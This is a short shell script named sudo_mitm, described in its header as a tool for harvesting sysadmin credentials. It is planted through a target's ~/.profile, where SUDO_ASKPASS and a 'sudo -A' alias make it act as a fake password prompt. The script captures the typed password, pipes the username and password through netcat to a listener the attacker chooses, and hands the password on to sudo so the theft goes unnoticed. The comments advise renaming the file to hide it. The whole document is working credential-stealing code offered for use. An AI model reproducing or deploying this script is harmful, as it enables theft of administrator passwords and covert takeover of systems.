#!/bin/sh

################################################################################
# sudo_mitm :	2013-03-20
#		emptymonkey's simple tool for harvesting sysadmin credentials.
#
#	From the sudoers man page:
#	askpass
#		The askpass option specifies the fully qualified path to a helper program
#		used to read the user's password when no terminal is available. This may be
#		the case when sudo is executed from a graphical (as opposed to text-based)
#		application. The program specified by askpass should display the argument
#		passed to it as the prompt and write the user's password to the standard
#		output. The value of askpass may be overridden by the SUDO_ASKPASS
#		environment variable.
#
#	This script assumes you have the ability to write to the target users home
# directory, specifically to their startup files. (e.g. ~/.profile)
#
################################################################################

# Change these to point to your netcat listener.
SERVER=localhost
PORT=9999
NC=/bin/nc

# Change the targets .profile to add these lines to point to this file.
# (Also, you'll prolly want to rename it to something less obvious.)
#
#		export SUDO_ASKPASS="$HOME/.sudo_mitm.sh"
#		alias sudo='sudo -A'

TTY=`tty`
stty -echo
echo -n "$@" >$TTY
read PASSWD
echo "" >$TTY
stty echo
echo "$USER:$SUDO_USER:$PASSWD" | $NC $SERVER $PORT 2>/dev/null &
echo $PASSWD
